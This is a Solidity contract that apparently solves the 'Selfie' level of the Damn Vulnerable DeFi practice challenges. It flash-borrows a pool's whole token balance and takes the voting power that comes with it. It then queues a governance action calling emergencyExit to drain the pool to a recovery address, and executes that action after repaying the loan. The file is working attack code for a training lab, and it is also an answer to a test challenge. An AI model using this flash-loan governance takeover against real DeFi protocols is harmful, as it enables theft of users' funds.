// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IERC3156FlashLender} from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {ISimpleGovernance} from "./ISimpleGovernance.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {DamnValuableVotes} from "../DamnValuableVotes.sol";

interface ISelfiePool {
        function token() external view returns (address);
        function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data) external returns (bool);
    }


contract AttackerContract is IERC3156FlashBorrower {
    address public governance;
    address public pool;
    address public recovery; 
    uint private actionID;


    constructor(address _governance, address _pool, address _recovery) {
        governance = _governance;
        pool = _pool;
        recovery = _recovery;
    }

    function attack() external {
        // call flashLoan on the pool with amount greater than half all pool tokens
        address token = ISelfiePool(pool).token();
        uint256 loanAmount = IERC20(token).balanceOf(address(pool));
        ISelfiePool(pool).flashLoan(this, token, loanAmount, "");
    }

    function onFlashLoan(
        address ,
        address token,
        uint256 amount,
        uint256 ,
        bytes calldata 
    ) external returns (bytes32) {
        // delegate voting to the attacker contract
        DamnValuableVotes votingToken = DamnValuableVotes(token);
        votingToken.delegate(address(this));
        // Logic to queue governance action
        actionID = ISimpleGovernance(governance).queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", recovery)
        );

        // approve tokens back to the pool
        IERC20(token).approve(pool, amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }


    function executeAction() external {
        // Logic to execute the queued action
        ISimpleGovernance(governance).executeAction(actionID);
    }
}